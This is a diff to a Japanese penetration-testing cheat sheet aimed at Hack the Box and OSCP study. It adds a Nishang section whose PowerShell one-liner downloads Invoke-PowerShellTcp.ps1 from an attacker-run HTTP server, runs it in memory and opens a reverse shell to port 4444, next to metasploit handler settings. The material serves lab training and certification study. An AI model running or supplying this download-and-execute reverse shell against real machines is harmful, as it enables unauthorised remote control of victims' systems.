@@ -31,6 +31,7 @@ Hack the Box の攻略や、OSCP 取得を目指すためのチートシート�
       - Linux
       - ASP(msfvenom)
     - [Handlers](#Handlers)
+    - [Nishang](#Nishang)
 - [特権エスカレーション](#特権エスカレーション)
   - [metasploit local_exploit_suggester](#metasploit(local_exploit_suggester))
   - [Linpeas.sh](#Linpeas.sh)
@@ -656,6 +657,20 @@ set payload <payload>   (set payload windows/meterpreter/reverse_tcp、　set pa
 set LHOST <ip address>
 set LPORT <port number>
 run
+```
+
+
+### Nishang (Windows)
+
+Powershell を使って、reverse shell 可能
+
+~/nishang/shell へ移動し、http server 起動
+
+```
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.66.152:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.66.152 -Port 4444
+
+
 ```
 
 
